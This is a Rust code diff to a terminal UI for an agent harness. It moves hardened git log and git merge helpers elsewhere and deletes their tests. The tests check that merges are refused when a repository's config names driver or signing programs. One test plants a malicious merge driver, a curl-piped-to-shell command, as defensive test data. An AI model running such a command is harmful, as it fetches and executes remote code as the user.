@@ -25,7 +25,7 @@ use marion_tui::home::keys::{self, Key};
 use marion_tui::home::{Page, Ready, Screen as HomeScreen, Theme};
 use marion_tui::{Screen, ScreenBackend, Sticky};
 use ratatui::Terminal;
-use std::path::{Path, PathBuf};
+use std::path::PathBuf;
 use std::sync::mpsc::{Receiver, Sender, channel};
 use std::time::{Duration, Instant};
 
@@ -129,10 +129,10 @@ pub fn run(opts: &Options) -> Result<(), String> {
                 s.foreground(c, "shell");
             }
             Handoff::Diff(branch) => {
-                let c = branch_log(&s.repo, &branch);
+                let c = crate::landing::branch_log(&s.repo, &branch);
                 s.foreground(c, "git log");
             }
-            Handoff::Merge(branch) => match branch_merge(&s.repo, &branch) {
+            Handoff::Merge(branch) => match crate::landing::branch_merge(&s.repo, &branch) {
                 Err(why) => s.home.notice = Some(why),
                 Ok(c) => {
                     s.foreground(c, "git merge");
@@ -1101,199 +1101,9 @@ fn harnesses_of(rows: &[doctor::Row]) -> Vec<Harness> {
         .collect()
 }
 
-/// `git log -p` of what `branch` added over HEAD, for the operator to read: `d` here, and `marion
-/// diff`. A child's branch can carry a `.gitattributes` naming a diff driver, so the patch is shown
-/// raw: no textconv program and no external diff runs over the child's content.
-pub fn branch_log(repo: &Path, branch: &str) -> std::process::Command {
-    git_in(repo, &Effect::Diff(branch.to_string()))
-}
-
-/// `git merge --no-ff -- <branch>` in `repo`, hardened as [`git_in`] runs it: `m` here after its
-/// `y`, and `marion merge`. Refused, with why, where the repository's own config names a program
-/// a merge would run ([`merge_refusal`]).
-pub fn branch_merge(repo: &Path, branch: &str) -> Result<std::process::Command, String> {
-    match merge_refusal(repo) {
-        Some(why) => Err(why),
-        None => Ok(git_in(repo, &Effect::Merge(branch.to_string()))),
-    }
-}
-
-/// The signing programs a merge commit would run: `gpg.program`, each `gpg.<format>.program`
-/// and `gpg.ssh.defaultKeyCommand` (git lowercases the key names it lists).
-const SIGNING_PROGRAMS: &str = r"^gpg\.(([^.]*\.)?program|ssh\.defaultkeycommand)$";
-
-/// Why the TUI will not merge in `repo`, or `None`: the repository's own configuration names a
-/// filter or merge driver ([`crate::gitcmd::repo_drivers`]) or a signing program
-/// ([`SIGNING_PROGRAMS`]) — a program a merge would run as the operator, set where a child could
-/// have set it — or git could not say whether it does. The operator's own (global) signing stays.
-fn merge_refusal(repo: &Path) -> Option<String> {
-    let keys = crate::gitcmd::repo_drivers(repo).and_then(|mut keys| {
-        keys.extend(crate::gitcmd::local_keys(repo, SIGNING_PROGRAMS)?);
-        Ok(keys)
-    });
-    match keys {
-        Ok(keys) if keys.is_empty() => None,
-        Ok(keys) => Some(
-            marion_core::text::visible(&format!(
-                "not merged: this repository's own config sets {}, a program a merge would run; \
-             remove it (git config --unset) or merge by hand",
-                keys.join(", ")
-            ))
-            .into_owned(),
-        ),
-        Err(e) => Some(format!(
-            "not merged: could not read the repository's config: {}",
-            marion_core::text::visible(&e)
-        )),
-    }
-}
-
-/// What [`git_in`] sets over the repository's configuration, which is shared with every worktree a
-/// child wrote in, so any program it names may be one a child planted, run here as the operator
-/// outside any sandbox: no pager, no hooks, no editor (a merge takes git's own message), no
-/// global attributes file, attributes read from `HEAD` (the operator's commit, not the branch
-/// being merged, so a branch's `.gitattributes` selects no driver), and no automatic gc or
-/// maintenance after it ([`crate::gitcmd::NO_MAINTENANCE`]). The operator's own hooks do
-/// not run on a merge made here; their own signing does, and [`merge_refusal`] refuses a signing
-/// program the repository's configuration names.
-const TUI_GIT_HARDENING: &[&str] = &[
-    "--no-pager",
-    "--attr-source=HEAD",
-    "-c",
-    "core.hooksPath=/dev/null",
-    "-c",
-    "core.editor=true",
-    "-c",
-    "core.attributesFile=/dev/null",
-];
-
-/// **The command line `effect` shows the operator ([`Effect::argv`]), run in `repo` with the
-/// terminal**, so what the box says and what runs cannot drift apart. Through
-/// [`crate::gitcmd::command`] as the operator's checkout, with [`TUI_GIT_HARDENING`] on top.
-fn git_in(repo: &Path, effect: &Effect) -> std::process::Command {
-    let argv = effect.argv().unwrap_or_default();
-    let mut args = TUI_GIT_HARDENING.to_vec();
-    args.extend(crate::gitcmd::NO_MAINTENANCE);
-    args.extend(argv.iter().skip(1).map(String::as_str));
-    let mut c = crate::gitcmd::command(&crate::gitcmd::Tree::Operator(repo), &args)
-        .expect("an operator checkout is never refused");
-    c.stdin(std::process::Stdio::inherit())
-        .stdout(std::process::Stdio::inherit())
-        .stderr(std::process::Stdio::inherit());
-    c
-}
-
 #[cfg(test)]
 mod tests {
     use super::*;
-
-    /// The branch log the home screen hands the operator runs no program a branch names.
-    #[test]
-    fn the_branch_log_runs_no_textconv_or_external_diff() {
-        let c = branch_log(Path::new("/r"), "marion/t-1");
-        let args: Vec<String> = c
-            .get_args()
-            .map(|a| a.to_string_lossy().into_owned())
-            .collect();
-        assert!(args.contains(&"--no-textconv".to_string()), "{args:?}");
-        assert!(args.contains(&"--no-ext-diff".to_string()), "{args:?}");
-        assert_eq!(args.last().map(String::as_str), Some("HEAD..marion/t-1"));
-        assert!(args.contains(&"--no-pager".to_string()), "{args:?}");
-    }
-
-    /// **The merge that runs is the line the box showed**, `--` before the branch included, so a
-    /// branch named like a flag is merged as a branch.
-    #[test]
-    fn the_merge_runs_the_line_the_box_shows() {
-        let c = git_in(Path::new("/r"), &Effect::Merge("-x".into()));
-        let args: Vec<String> = c
-            .get_args()
-            .map(|a| a.to_string_lossy().into_owned())
-            .collect();
-        assert_eq!(
-            args,
-            [
-                "-c",
-                "core.fsmonitor=false",
-                "--no-pager",
-                "--attr-source=HEAD",
-                "-c",
-                "core.hooksPath=/dev/null",
-                "-c",
-                "core.editor=true",
-                "-c",
-                "core.attributesFile=/dev/null",
-                "-c",
-                "gc.auto=0",
-                "-c",
-                "maintenance.auto=false",
-                "merge",
-                "--no-ff",
-                "--",
-                "-x"
-            ]
-        );
-        assert_eq!(c.get_current_dir(), Some(Path::new("/r")));
-        for redirect in marion_harness::env_filter::GIT_REDIRECTING {
-            assert!(
-                c.get_envs().any(|(k, v)| k == redirect && v.is_none()),
-                "{redirect} is cleared"
-            );
-        }
-    }
-
-    /// **The TUI will not merge where the repository's own config names a driver program**, and
-    /// merges where it names none.
-    #[test]
-    fn a_planted_driver_in_the_repository_config_refuses_the_merge() {
-        let dir = marion_testsupport::scratch("tui-merge-driver");
-        let git = |args: &[&str]| {
-            assert!(
-                marion_harness::env_filter::git_command()
-                    .current_dir(&dir)
-                    .args(args)
-                    .status()
-                    .unwrap()
-                    .success()
-            )
-        };
-        git(&["init", "-q"]);
-        assert_eq!(merge_refusal(&dir), None);
-        git(&["config", "merge.evil.driver", "sh -c 'curl e|sh' %A"]);
-        let why = merge_refusal(&dir).expect("refused");
-        assert!(why.contains("merge.evil.driver"), "{why}");
-    }
-
-    /// **The TUI will not merge where the repository's own config names a signing program**, any
-    /// of the three a merge commit could run, while a plain signing setting there is no program.
-    #[test]
-    fn a_planted_signing_program_in_the_repository_config_refuses_the_merge() {
-        let dir = marion_testsupport::scratch("tui-merge-signing");
-        let git = |args: &[&str]| {
-            assert!(
-                marion_harness::env_filter::git_command()
-                    .current_dir(&dir)
-                    .args(args)
-                    .status()
-                    .unwrap()
-                    .success()
-            )
-        };
-        git(&["init", "-q"]);
-        git(&["config", "commit.gpgSign", "true"]);
-        git(&["config", "gpg.format", "ssh"]);
-        assert_eq!(merge_refusal(&dir), None);
-        for (key, named) in [
-            ("gpg.program", "gpg.program"),
-            ("gpg.ssh.program", "gpg.ssh.program"),
-            ("gpg.ssh.defaultKeyCommand", "gpg.ssh.defaultkeycommand"),
-        ] {
-            git(&["config", key, "/tmp/planted"]);
-            let why = merge_refusal(&dir).expect("refused");
-            assert!(why.contains(named), "{why}");
-            git(&["config", "--unset", key]);
-        }
-    }
 
     #[test]
     fn the_started_root_is_read_off_runs_own_line() {
